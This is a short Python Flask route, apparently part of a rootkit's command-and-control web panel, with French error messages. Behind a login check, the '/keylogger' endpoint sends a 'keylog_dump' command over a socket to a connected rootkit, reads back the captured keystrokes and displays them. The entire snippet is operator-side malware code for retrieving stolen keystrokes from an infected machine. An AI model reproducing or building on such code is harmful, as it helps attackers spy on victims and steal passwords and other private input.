# -------------------------------- KEYLOGGER -------------------------------- #

@app.route('/keylogger')
def keylogger():
    if not authenticated:
        return redirect(url_for('login'))
    try:
        with connection_lock:
            if rootkit_connection:
                rootkit_connection.sendall(b"keylog_dump\n")
                rootkit_connection.settimeout(2)
                data = rootkit_connection.recv(BUFFER_SIZE).decode()
                rootkit_connection.settimeout(None)
                keylog_data = data.strip()
            else:
                keylog_data = "Aucune connexion au rootkit."
    except Exception as e:
        keylog_data = f"Erreur : {e}"
    return render_template("keylogger.html", keylog_data=keylog_data)